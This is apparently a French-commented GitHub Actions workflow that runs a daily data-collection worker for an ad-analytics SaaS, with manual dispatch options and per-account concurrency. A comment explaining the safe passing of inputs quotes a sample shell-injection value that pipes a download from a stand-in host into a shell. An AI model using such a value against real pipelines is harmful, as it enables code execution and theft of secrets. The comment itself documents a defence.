name: Fetch automatique des données

# Tourne chaque jour à 07:00 UTC. Le worker ne traite que les utilisateurs
# dont c'est le jour de mise à jour (profiles.fetch_schedule) — défaut : lundi.
on:
  schedule:
    - cron: "0 7 * * *"
  workflow_dispatch:        # permet de lancer à la main depuis l'onglet Actions
    inputs:
      force:
        description: "Ignorer le jour planifié (fetch tous les users)"
        type: boolean
        default: false
      user_id:
        description: "Ne traiter que cet utilisateur (récolte d'amorçage de Pulse, ou rejeu à la main)"
        type: string
        default: ""
      label_only:
        description: "Labellisation IA seule + republication du rapport"
        type: boolean
        default: false
      categorize_only:
        description: "Catégorisation IA des conversions GA4 seule"
        type: boolean
        default: false
      report_only:
        description: "Republie juste le rapport/conseils depuis les données en base"
        type: boolean
        default: false
      meta_since:
        description: "Rejeu d'historique : fait repartir la récolte META de cette date (AAAA-MM-JJ). EXIGE user_id. Le reste de la récolte de CE compte tourne normalement (Google, GA4, Instagram, rapport, email)."
        type: string
        default: ""

# UNE RÉCOLTE À LA FOIS PAR COMPTE. Tant que le seul départ manuel était le
# bouton « ↻ Mes données », personne ne pouvait en lancer deux coup sur coup.
# Depuis que brancher une source déclenche sa récolte
# (`saas/web/app/comptes/actions.ts`), choisir son compte Google Ads puis sa
# propriété Analytics en fait partir DEUX à quelques secondes d'intervalle :
# deux workers sur le même compte écriraient `fetch_progress` en même temps et
# publieraient le rapport deux fois. Elles s'attendent donc, par compte — la
# clé vide regroupe les passages du cron, qui ne tourne qu'une fois par jour.
# `cancel-in-progress: false` : on ne coupe jamais une récolte en cours, elle
# peut être à sa quinzième minute d'Instagram.
concurrency:
  group: recolte-${{ inputs.user_id }}
  cancel-in-progress: false

jobs:
  fetch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install deps
        run: pip install -r requirements.txt

      - name: Run fetch worker
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
          GOOGLE_ADS_CLIENT_ID: ${{ secrets.GOOGLE_ADS_CLIENT_ID }}
          GOOGLE_ADS_CLIENT_SECRET: ${{ secrets.GOOGLE_ADS_CLIENT_SECRET }}
          GOOGLE_ADS_DEVELOPER_TOKEN: ${{ secrets.GOOGLE_ADS_DEVELOPER_TOKEN }}
          GOOGLE_ADS_LOGIN_CUSTOMER_ID: ${{ secrets.GOOGLE_ADS_LOGIN_CUSTOMER_ID }}
          # Optionnel : brief IA du rapport publié (fallback déterministe sinon)
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
          # Optionnel : email hebdo via Resend (sans clé → dry-run, aucun envoi)
          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
          EMAIL_FROM: ${{ secrets.EMAIL_FROM }}
          # TOUTES LES ENTRÉES PASSENT PAR L'ENVIRONNEMENT, aucune n'est
          # interpolée en `${{ }}` dans le script. Une entrée de
          # workflow_dispatch est du texte libre : collée telle quelle dans le
          # shell, `x"; curl evil | sh; #` s'exécuterait sur le runner, où
          # vivent SUPABASE_SERVICE_KEY, GEMINI_API_KEY et RESEND_API_KEY. Les
          # booléens sont comparés à la chaîne "true", jamais exécutés.
          META_SINCE: ${{ inputs.meta_since }}
          USER_ID: ${{ inputs.user_id }}
          REPORT_ONLY: ${{ inputs.report_only }}
          LABEL_ONLY: ${{ inputs.label_only }}
          CATEGORIZE_ONLY: ${{ inputs.categorize_only }}
          FORCE: ${{ inputs.force }}
        run: |
          W=saas/collecte/automatisation/fetch_all.py
          if [ "$REPORT_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
            python "$W" --report-only "$USER_ID"
          elif [ "$LABEL_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
            python "$W" --label-only "$USER_ID"
          elif [ "$CATEGORIZE_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
            python "$W" --categorize-only "$USER_ID"
          elif [ -n "$META_SINCE" ]; then
            # meta_since SANS user_id est refusé par le worker lui-même, et
            # c'est volontaire : forcer le passage de TOUS les comptes un jour
            # qui n'est celui de personne leur enverrait à tous l'email hebdo
            # (publish_weekly_report envoie dès qu'il a une adresse, sans
            # contrôle de jour). Un rejeu vise un compte.
            python "$W" --meta-since "$META_SINCE" --user "$USER_ID"
          elif [ -n "$USER_ID" ]; then
            python "$W" --user "$USER_ID"
          elif [ "$FORCE" = "true" ]; then
            python "$W" --force
          else
            python "$W"
          fi
